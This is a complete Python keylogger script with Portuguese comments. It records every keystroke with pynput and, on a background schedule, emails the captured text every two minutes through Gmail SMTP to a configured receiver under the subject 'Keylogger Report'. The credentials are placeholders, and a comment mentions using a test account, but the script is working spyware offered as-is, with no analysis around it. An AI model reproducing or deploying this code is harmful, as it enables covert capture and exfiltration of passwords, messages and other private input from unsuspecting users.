#!/usr/bin/env python3
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
import schedule
import time
import threading

# Configurações de e-mail
email = "seu_email@example.com"  # Substitua por um e-mail de teste
password = "sua_senha"           # Substitua pela senha de seguranca Google do e-mail de teste
receiver_email = "destinatario@example.com"  # E-mail para receber os logs

# Variável para armazenar as teclas pressionadas
log = []

# Função para enviar o log por e-mail
def enviar_email():
    if log:
        message = MIMEMultipart()
        message["From"] = email
        message["To"] = receiver_email
        message["Subject"] = "Keylogger Report"

        body = "Relatório de teclas:\n" + ''.join(log)
        message.attach(MIMEText(body, "plain"))

        context = ssl.create_default_context()
        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(email, password)
                server.sendmail(email, receiver_email, message.as_string())
            print("E-mail enviado com sucesso.")
            log.clear()
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")

# Função para registrar as teclas pressionadas
def on_press(key):
    try:
        log.append(f'{key.char}')
    except AttributeError:
        log.append(f' {key} ')

# Função para parar o keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Agendamento do envio de e-mails
def agendar_envio_email():
    schedule.every(2).minutes.do(enviar_email)
    schedule.every(48).hours.do(enviar_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

# Inicia o agendamento em uma thread separada
envio_thread = threading.Thread(target=agendar_envio_email)
envio_thread.daemon = True
envio_thread.start()

# Captura de teclas
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
